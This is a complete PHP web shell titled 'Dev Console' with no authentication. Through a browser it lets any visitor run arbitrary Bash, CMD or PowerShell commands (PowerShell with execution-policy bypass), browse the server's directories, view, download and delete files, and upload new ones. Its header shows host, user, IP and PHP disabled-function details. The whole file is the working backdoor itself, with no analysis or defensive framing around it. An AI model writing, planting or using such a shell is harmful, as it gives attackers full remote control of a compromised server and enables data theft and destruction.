<?php
// ------------- CONFIG & INPUT --------------
$cwd = $_POST['cwd'] ?? getcwd();
$cmd = $_POST['cmd'] ?? '';
$mode = $_POST['mode'] ?? 'shell';

// Directory navigation
if (isset($_GET['dir'])) {
    $new_dir = $_GET['dir'];
    if (is_dir($new_dir)) {
        $cwd = realpath($new_dir);
    }
}

// File actions: view, delete, download (kept your original logic)
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file)) {
        header('Content-Type: text/plain; charset=utf-8');
        echo file_get_contents($file);
        exit;
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (file_exists($file) && is_file($file)) {
        unlink($file);
    }
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Type: application/octet-stream');
        readfile($file);
        exit;
    }
}

// Improved Command Execution for Windows/Linux
function exec_command($cmd, $mode, $cwd) {
    if (!$cmd) return '';
    
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    
    if ($mode === 'powershell' && $isWin) {
        // Use full path and bypass flags
        $psPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
        // We move to the directory first then run command
        $fullCmd = "cd /d \"$cwd\" && $psPath -NoProfile -ExecutionPolicy Bypass -NonInteractive -Command \"$cmd\" 2>&1";
        return shell_exec($fullCmd);
    } else {
        // Standard shell execution
        $prefix = $isWin ? "cd /d \"$cwd\" && " : "cd " . escapeshellarg($cwd) . " && ";
        return shell_exec($prefix . $cmd . ' 2>&1');
    }
}

function sys_info() {
    return [
        'Hostname' => gethostname(),
        'User' => get_current_user(),
        'IP' => gethostbyname(gethostname()),
        'OS' => PHP_OS,
        'Path' => realpath($cwd),
        'PHP' => PHP_VERSION,
        'Disabled' => ini_get('disable_functions') ?: 'None'
    ];
}

function list_files($dir) {
    if (!is_dir($dir)) return [];
    $files = scandir($dir);
    return array_diff($files, ['.', '..']);
}

// Upload handling
if ($_FILES['upload']['tmp_name'] ?? false) {
    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Dev Console</title>
<style>
  :root { --primary: #6366f1; --bg: #0f172a; --panel: #1e293b; --text: #f1f5f9; --green: #00ff88;}
  body { margin:0; font-family: 'Inter', system-ui, sans-serif; background: var(--bg); color: var(--text); height:100vh; display:flex; flex-direction: column; }
  header { background: var(--panel); padding: 10px 20px; border-bottom: 1px solid #334155; display:flex; justify-content: space-between; align-items: center; }
  main { flex: 1; display: flex; gap: 1rem; padding: 1rem; overflow: hidden; }
  section { background: var(--panel); border-radius: 12px; padding: 1.2rem; overflow-y: auto; border: 1px solid #334155; }
  
  #file-manager { flex: 1.2; }
  table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
  th { text-align: left; color: #94a3b8; padding: 0.8rem; border-bottom: 2px solid #334155; }
  td { padding: 0.6rem 0.8rem; border-bottom: 1px solid #334155; font-family: monospace; }
  tr:hover { background: #334155; }
  
  .action-btn { text-decoration: none; padding: 4px 8px; border-radius: 4px; font-size: 12px; color: white; margin-right: 4px; }
  .view { background:#3b82f6; } .download { background:#10b981; } .delete { background:#ef4444; }
  .folder { color: #f59e0b; font-weight: bold; text-decoration: none; }
  .sys-badge {  background: #334155; padding: 5px 12px; border-radius: 6px; font-size: 14px; color: #00ff88; border: 1px solid #334155; margin-left: 10px;}
  #terminal { flex: 1; display: flex; flex-direction: column; }
  #output { flex: 1; background: #000; color: #10b981; padding: 1rem; border-radius: 8px; font-family: 'Consolas', monospace; overflow-y: auto; white-space: pre-wrap; font-size: 13px; border: 1px solid #334155; }
  
  .input-group { display: flex; gap: 5px; margin-top: 10px; }
  input[type="text"], select { background: #0f172a; border: 1px solid #334155; color: white; padding: 8px; border-radius: 4px; }
  button { background: var(--primary); color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }

</style>
</head>
<body>

<header>
  <div style="font-size:20px;"><strong><a href="<?=$_SERVER['PHP_SELF']?>" style="color:#fff;text-decoration:none;">⚡ DEV_CONSOLE</a></strong></div>
  <div style="display:flex; gap:0px;">
  <span class="sys-badge"><strong>Hostname:</strong> <?php echo gethostname(); ?></span>
<span class="sys-badge"><strong>User:</strong> <?php echo get_current_user(); ?></span>
<span class="sys-badge"><strong>IP:</strong> <?php echo gethostbyname(gethostname()); ?></span>
<span class="sys-badge"><strong>OS:</strong> <?php echo PHP_OS; ?></span>
<span class="sys-badge"><strong>Path:</strong> <?php echo realpath($cwd); ?></span>
<span class="sys-badge"><strong>PHP:</strong> <?php echo PHP_VERSION; ?></span>
<span class="sys-badge"><strong>Disabled:</strong> <?php echo ini_get('disable_functions') ?: 'None'; ?></span>
  </div>
</header>

<main>
  <section id="file-manager">
    <div style="display:flex; justify-content:space-between; align-items:center;">
        <h3 style="margin:0;">Path: <?php echo htmlspecialchars($cwd); ?></h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="upload" style="font-size:14px;">
            <button type="submit" style="padding:4px 8px; font-size:14px;">Upload</button>
        </form>
    </div>
    <hr style="border:0; border-top:1px solid #334155; margin:15px 0;">
    <table>
      <thead>
        <tr><th>Name</th><th>Size</th><th style="text-align:center">Actions</th></tr>
      </thead>
      <tbody>
        <?php
          $parent = dirname($cwd);
          echo "<tr><td colspan='3'><a href='?dir=" . urlencode($parent) . "' class='folder'>[ .. ]</a></td></tr>";
          foreach(list_files($cwd) as $file):
            $path = $cwd . DIRECTORY_SEPARATOR . $file;
            $is_dir = is_dir($path);
        ?>
        <tr>
          <td>
            <?php if($is_dir): ?>
              <a href="?dir=<?php echo urlencode($path); ?>" class="folder">📁 <?php echo htmlspecialchars($file); ?></a>
            <?php else: ?>
              📄 <?php echo htmlspecialchars($file); ?>
            <?php endif; ?>
          </td>
          <td><?php echo $is_dir ? '--' : round(filesize($path)/1024, 2) . ' KB'; ?></td>
          <td style="text-align:center">
            <?php if(!$is_dir): ?>
              <a href="?view=<?php echo urlencode($path); ?>" target="_blank" class="action-btn view">View</a>
              <a href="?download=<?php echo urlencode($path); ?>" class="action-btn download">Get</a>
              <a href="?delete=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($cwd); ?>" onclick="return confirm('Delete?')" class="action-btn delete">Del</a>
            <?php endif; ?>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
  </section>

  <section id="terminal">
    <h3 style="margin-top:0;">Terminal</h3>
    <pre id="output"><?php 
        if ($cmd) {
            echo "Directory: $cwd\n";
            echo "Command: $cmd\n";
            echo "--------------------------------------------------\n";
            echo htmlspecialchars(exec_command($cmd, $mode, $cwd)); 
        } else {
            echo "Waiting for command...";
        }
    ?></pre>
    <form method="post" class="input-group">
        <select name="mode">
          <option value="shell" <?php if($mode==='shell') echo 'selected'; ?>>CMD / Bash</option>
          <option value="powershell" <?php if($mode==='powershell') echo 'selected'; ?>>PowerShell</option>
        </select>
        <input type="text" name="cmd" style="flex:1" placeholder="Enter command..." autofocus>
        <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
        <button type="submit">Execute</button>
    </form>
  </section>
</main>

<script>
    // Auto-scroll terminal to bottom
    const out = document.getElementById('output');
    out.scrollTop = out.scrollHeight;
</script>

</body>
</html>
